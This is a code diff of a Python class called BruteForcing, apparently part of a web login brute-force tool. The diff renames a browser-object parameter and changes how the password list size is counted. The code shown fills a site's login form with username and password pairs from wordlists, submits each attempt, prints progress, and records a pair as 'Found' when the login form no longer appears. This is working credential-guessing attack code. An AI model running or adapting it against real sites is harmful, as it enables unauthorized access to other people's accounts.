@@ -39,7 +39,7 @@ class BruteForcing(object):
 		self.frmPassField = ''
 		self.lstUsername = optUsrList
 		self.lstPassword = optPassList
-		self.szPassword = actions.subaction_countListSize(self.lstPassword.readlines())
+		self.szPassword = actions.subaction_countListSize(self.lstPassword)
 		self.fndData = []
 		self.actTestConnection()
 
@@ -71,26 +71,26 @@ class BruteForcing(object):
 	def actGetResult(self):
 		return self.fndData
 
-	def actTryTargetLogin(self, browserObject, tryUsername, tryPassword, count):
+	def actTryTargetLogin(self, objBrowser, tryUsername, tryPassword, count):
 		try:
 			#	Fill Login field Information
-			browserObject.select_form(nr = self.frmLoginID)
-			browserObject.form[self.frmUserField] = tryUsername
-			browserObject.form[self.frmPassField] = tryPassword
+			objBrowser.select_form(nr = self.frmLoginID)
+			objBrowser.form[self.frmUserField] = tryUsername
+			objBrowser.form[self.frmPassField] = tryPassword
 
 			#	Print progress bar
 			utils.prints("%10s : %20s%12s%10s / %10s" %(tryUsername, tryPassword, '=' * 6, count, self.szPassword))
 
 			#	Send request
-			browserObject.submit()
+			objBrowser.submit()
 
 			#	Refresh page, useful for redirect after login
-			browserObject.reload()
+			objBrowser.reload()
 
 			#	If result has no login form  -> Success **NEED IMPROVE**
 			#		add login information to fndData, return True
 
-			if not actions.action_getFormInformation(browserObject.forms()):
+			if not actions.action_getFormInformation(objBrowser.forms()):
 				utils.printf("Found: %s:%s" %(tryUsername, tryPassword), "good")
 				self.fndData.append([tryUsername, tryPassword])
 				return True
